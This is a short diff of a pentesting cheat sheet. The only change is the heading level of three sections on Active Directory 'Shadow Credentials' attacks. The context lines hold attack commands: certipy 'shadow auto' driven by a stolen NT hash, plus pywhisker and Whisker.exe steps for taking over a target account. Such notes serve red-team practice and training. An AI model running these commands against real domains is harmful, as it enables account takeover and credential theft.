@@ -6,7 +6,7 @@ Check bloodhound sudgestions to know if this attack vector is available in your 
 ____________________________________________________
 
 
-## SHADOW CREDENTIALS ATTACK (with certipy, RECOMENDED):
+### SHADOW CREDENTIALS ATTACK (with certipy, RECOMENDED):
 
  * REQUIREMENTS: Get certipy (or certipy-ad in kali) AND UPDATE IT to the last version -> https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
 
@@ -17,7 +17,7 @@ ____________________________________________________
 ` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
 
-## SHADOW CREDENTIALS ATTACK (old school method, with pywisker):
+### SHADOW CREDENTIALS ATTACK (old school method, with pywisker):
 
  * REQUIREMENTS: Get pywhisker, "gettgtpkinit.py" and "getnthash.py" from this repositoris:
    
@@ -43,7 +43,7 @@ ____________________________________________________
 ______________________________________________________
 
 
-## SHADOW CREDENTIALS ATTACK (with whisker.exe):
+### SHADOW CREDENTIALS ATTACK (with whisker.exe):
 
  Upload Whisker.exe to the target machine and execute:
   ` ./Whisker.exe add /target:<target user> `
